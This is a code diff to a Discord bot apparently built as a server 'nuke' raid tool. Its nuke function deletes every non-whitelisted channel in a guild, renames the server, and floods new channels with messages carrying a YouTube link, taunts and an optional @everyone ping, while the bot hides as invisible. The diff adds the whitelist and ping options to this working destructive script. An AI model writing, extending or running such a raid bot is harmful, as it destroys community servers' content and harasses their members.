@@ -1,15 +1,20 @@
-const chalk = require('chalk');
-
 console.log('Your Cum Wont Last v1.0');
 console.log('loading...');
 
+const chalk = require('chalk');
+const fs = require('fs');
+// const terminalLink = require('terminal-link')
+
 // MODIFY THIS BEFORE RUNNING
 const censor = true // censor trigger
-const whitelist = false // channel whitelist (not done yet)
+const whitelist = true // channel whitelist
 const server = true // change name of the server
+const ping = false // ping @everyone
 const gomsg = "Let's funk !"
 // END OF MODIFY VALUE
 const sorro = "epic" // dont touch
+let list = []
+let mention = null
 let path = null
 if(censor == false) {
 path = "lyrics.txt"
@@ -17,10 +22,35 @@ path = "lyrics.txt"
 path = "lyrics-censored.txt"
 }
 
+if(whitelist == true) {
+    try {
+        // read contents of the file
+        const data = fs.readFileSync('./whitelist.txt', 'UTF-8');
+    
+        // split the contents by new line
+        const lines = data.split(/\r?\n/);
+    
+        // print all lines
+        lines.forEach((line) => {
+            let lin = line.replace(" ", "-");
+            lin = lin.replace("*", "");
+            list.push(lin);
+            console.log(chalk.green(`Whitelisted "${line}".`))
+        });
+    } catch (err) {
+        console.error(err);
+    }
+}
+
+if(ping == true) {
+    mention = "@everyone"
+} else {
+    mention = ""
+}
+
 const fullpath = `./lyrics/${path}`
 
 const txt = ["JJsploit suck balls", "Auri cute", "Ah man you just got cum wont last' ed", "Retro hub moment", "dont use fluxus with your main account pls", "KEEP MEMES OUT OF GENERAL", "JJSPLOIT PRENIUM BEST SS ONLY 1M BOBUX §&!1§§1!§1!!&§1§1§1!&"]
-const rng = txt[Math.floor(Math.random() * (txt.length - 0 + 1) + 0)]
 
 function wait(ms) {
     let start = new Date().getTime();
@@ -32,7 +62,6 @@ function wait(ms) {
 }
 
 // idc if i copy paste it's the skeleton code
-const fs = require('fs');
 const { Client, Intents, Permissions } = require('discord.js');
 const dotenv = require("dotenv");
 const internal = require('stream')
@@ -46,6 +75,12 @@ client.on('ready', () => {
 	console.log('Your Cum Wont Last v1.0 loaded !');
     setInterval(function(){ client.user.setPresence('invisible'); }, 1000);
     console.log(`say "${gomsg}" to start !`);
+    // wait(500)
+    // const link = terminalLink('Source Code', 'https://github.com/Error-Cezar/Your-Funk-Wont-Last-BOT');
+    // console.log(link)
+    // wait(500)
+    // const link1 = terminalLink('Discord Server', 'https://discord.gg/KJUg4PXPP7');
+    // console.log(link1)
 
 
 });
@@ -61,9 +96,13 @@ client.on("messageCreate", (message) => {
 
 async function nuke(msg) {
     msg.guild.channels.cache.forEach(async (channel, id) => {
+        if(!list.includes(channel.name, 0)) {
         channel.delete()
-  .then(console.log(chalk.red(`deleted ${channel.name}`)))
-  .catch(console.error);
+        .then(console.log(chalk.red(`deleted ${channel.name}`)))
+        .catch(console.error);
+        } else {
+        console.log(chalk.cyan(`${channel.name} is whitelisted channel wasn't deleted.`))
+        }
     });
 
     if(server == true) {
@@ -88,7 +127,12 @@ async function nuke(msg) {
                     id: msg.guild.id,
                     allow: ["VIEW_CHANNEL"],
                 }]
-            })  //.send(`https://www.youtube.com/watch?v=7Do70nztRNE | ${rng}`)
+            }).then(channel => {
+                var randomNumber = Math.floor(Math.random()*txt.length);
+                const rng = txt[randomNumber]
+                channel.send(`${mention} | https://www.youtube.com/watch?v=7Do70nztRNE | ${rng}`)
+              })
+
             console.log(chalk.green(`create channel ${line}`));
         });
     } catch (err) {
